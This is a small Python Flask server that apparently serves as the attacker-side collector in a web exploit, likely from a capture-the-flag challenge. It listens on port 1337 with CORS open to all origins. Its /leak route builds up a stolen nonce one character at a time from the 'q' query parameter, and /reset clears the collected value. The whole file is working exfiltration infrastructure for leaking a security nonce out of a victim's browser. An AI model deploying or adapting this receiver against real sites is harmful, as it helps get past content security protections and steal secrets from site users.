from flask import Flask, request
import requests
import urllib.parse
import string

NONCE = ""

app = Flask(__name__)
s = requests.Session()

@app.after_request
def add_header(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route("/reset")
def reset():
    global NONCE
    NONCE = ""
    print("[-] Reset NONCE")
    return ""

counter_for_idk = 0
@app.route("/leak")
def leak():
    global NONCE, counter_for_idk
    q = request.args.get('q')
    if q is not None:
        if counter_for_idk == 0:
            print("ignore")
            counter_for_idk += 1        
        NONCE += q
        print(f"[-] append NONCE {NONCE}")
    return NONCE
    
@app.route("/")
def test():
    return "test"

if __name__ == "__main__":
    print("[info] running app ...")
    app.run(host="0.0.0.0", port=1337)